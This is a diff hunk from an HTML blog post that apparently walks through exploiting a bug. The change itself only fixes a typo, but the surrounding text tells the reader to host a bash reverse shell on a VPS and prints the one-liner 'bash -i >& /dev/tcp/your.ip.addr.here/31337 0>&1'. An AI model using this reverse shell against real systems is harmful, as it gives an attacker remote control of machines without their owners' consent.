@@ -163,7 +163,7 @@
 
 <p>Exploiting this bug is a little bit more fun. At the time I created this method, there were no working tools to test. I had only seen someone online&rsquo;s log and tried to emulate that to the best of my ability.</p>
 
-<p>The first step is to hop on you VPS and create a file with a simple bash reverse shell in it and throw that in your web root.</p>
+<p>The first step is to hop on your VPS and create a file with a simple bash reverse shell in it and throw that in your web root.</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>bash -i >& /dev/tcp/your.ip.addr.here/31337 0>&1</span></code></pre></td></tr></table></div></figure>
